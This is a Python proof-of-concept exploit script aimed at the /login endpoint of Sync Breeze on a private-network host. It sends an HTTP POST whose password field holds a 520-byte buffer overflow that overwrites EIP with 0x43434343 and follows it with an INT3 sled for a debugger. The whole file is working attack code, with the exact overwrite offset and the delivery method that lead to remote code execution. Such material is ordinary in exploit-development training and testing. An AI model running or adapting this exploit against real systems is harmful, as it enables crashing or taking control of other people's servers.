#!/usr/bin/env python3
import socket
import sys

# Configuration
TARGET_IP   = '10.1.116.86'   # Sync Breeze host IP
TARGET_PORT = 80               # HTTP port
PATH        = '/login'         # Vulnerable endpoint

def build_trap_payload():
    """
    Construct a payload that:
      - Pads with 'A' up to the saved EIP (520 bytes)
      - Overwrites EIP with 'C' * 4 (0x43 0x43 0x43 0x43)
      - Follows with an INT3 sled (0xCC) to break in the debugger
    """
    offset = 520
    eip_overwrite = "C" * 4      # 0x43 0x43 0x43 0x43
    int3_sled     = "\xCC" * 8   # eight INT3 instructions
    return "A" * offset + eip_overwrite + int3_sled

def build_http_request(payload):
    """
    Wrap the payload into a minimal HTTP POST to /login.
    """
    body = f"username=test&password={payload}"
    request_lines = [
        f"POST {PATH} HTTP/1.1",
        f"Host: {TARGET_IP}",
        "User-Agent: quick-debug-client",
        "Content-Type: application/x-www-form-urlencoded",
        f"Content-Length: {len(body)}",
        "Connection: close",
        "",
        body
    ]
    # Join with CRLF
    return "\r\n".join(request_lines)

def send_request(request):
    """
    Open a TCP connection to the target and send the raw HTTP request.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5.0)
        s.connect((TARGET_IP, TARGET_PORT))
        s.sendall(request.encode('latin-1'))
        # No need to read response; we're triggering a crash/break
        try:
            s.recv(1024)
        except socket.timeout:
            pass

if __name__ == "__main__":
    print(f"[+] Building trap payload for {TARGET_IP}:{TARGET_PORT}{PATH}")
    payload = build_trap_payload()

    print(f"[+] Constructing HTTP request ({len(payload)}-byte payload)")
    http_request = build_http_request(payload)

    print("[+] Sending payload…")
    try:
        send_request(http_request)
        print("[*] Payload sent. Check your debugger for EIP=0x43434343 or INT3 break.")
    except Exception as e:
        print(f"[!] Error sending payload: {e}", file=sys.stderr)
        sys.exit(1)
